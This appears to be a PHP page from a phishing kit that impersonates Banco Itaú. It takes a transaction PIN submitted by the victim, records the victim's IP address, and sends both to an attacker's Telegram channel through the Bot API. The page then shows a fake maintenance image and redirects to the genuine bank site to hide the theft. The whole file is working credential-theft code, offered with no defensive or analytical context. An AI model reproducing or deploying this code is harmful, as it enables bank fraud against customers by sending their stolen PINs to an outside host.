<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
include('datos.php');

if ( isset ($_POST['segundo']) ){

$message = ":::Banco Itaú:::\r\nPIN Transaccional.: ".$_POST['segundo']."\r\nIP: ".$userp."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


}

?>
<html><head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width">
   <meta http-equiv="refresh" content="10; url=https://www.itau.com.py"></head><body>.
   <title>Mantenimiento</title>


   <img src="img/mant1.png" style="margin-top: -30px; width: 100%;">

   
   


</body></html>